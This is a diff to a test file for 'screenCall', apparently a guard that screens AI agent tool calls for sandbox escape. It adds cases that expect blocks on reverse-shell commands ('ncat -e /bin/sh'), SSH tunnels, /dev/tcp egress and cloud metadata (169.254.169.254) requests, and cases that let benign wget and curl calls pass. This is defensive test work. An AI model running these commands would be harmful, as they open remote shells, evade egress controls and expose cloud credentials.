@@ -96,6 +96,9 @@ describe("screenCall", () => {
     pass("bash", { command: "curl -X POST https://example.com" });
     pass("bash", { command: "ssh user@host ls -R" });
     pass("bash", { command: "ssh -l user host" });
+    pass("bash", { command: "wget -x -nH https://example.com/foo/bar" });
+    pass("bash", { command: "wget --proxy=off https://example.com" });
+    pass("bash", { command: "curl --proxy-header X-Foo:bar https://example.com" });
   });
 
   test("write_file is not inspectable even when the path names IMDS", () => {
@@ -162,6 +165,12 @@ describe("screenCall", () => {
     );
     pass("bash", { command: "echo 169.254.170.2" });
     pass("bash", { command: "echo metadata.google.internal" });
+    blockEscape(
+      "powershell",
+      { command: "Invoke-RestMethod -Uri 169.254.169.254" },
+      "imds",
+      "link-local cloud metadata IPv4 169.254.169.254",
+    );
   });
 
   test("IMDS path and credential-env rows are substrings", () => {
@@ -252,6 +261,25 @@ describe("screenCall", () => {
       { command: "ncat --exec /bin/sh host 4444" },
       "egress-evasion",
       "ncat --exec",
+    );
+    blockEscape("bash", { command: "ncat -e /bin/sh host 4444" }, "egress-evasion", "nc -e");
+    blockEscape(
+      "bash",
+      { command: "ncat --sh-exec /bin/sh host 4444" },
+      "egress-evasion",
+      "ncat --exec",
+    );
+    blockEscape(
+      "bash",
+      { command: "ssh -o DynamicForward=1080 host" },
+      "egress-evasion",
+      "ssh tunnel",
+    );
+    blockEscape(
+      "bash",
+      { command: "ssh -o LocalForward=8080:localhost:80 host" },
+      "egress-evasion",
+      "ssh tunnel",
     );
     blockEscape("bash", { command: "echo >/dev/tcp/1.2.3.4/80" }, "egress-evasion", "/dev/tcp/");
     blockEscape("bash", { command: "echo >/dev/udp/1.2.3.4/53" }, "egress-evasion", "/dev/udp/");
@@ -386,5 +414,17 @@ describe("screenCall", () => {
     );
     pass("mcp_github_fetch", { arguments: { url: "https://example.com" } });
     blockEscape("mcp_aws_sts_assume_role", { arguments: {} }, "cross-tenant", "assume-role");
+    blockEscape(
+      "mcp_http",
+      { arguments: { host: "169.254.169.254" } },
+      "imds",
+      "link-local cloud metadata IPv4 169.254.169.254",
+    );
+    blockEscape(
+      "mcp_http",
+      { arguments: { url: "169.254.169.254" } },
+      "imds",
+      "link-local cloud metadata IPv4 169.254.169.254",
+    );
   });
 });
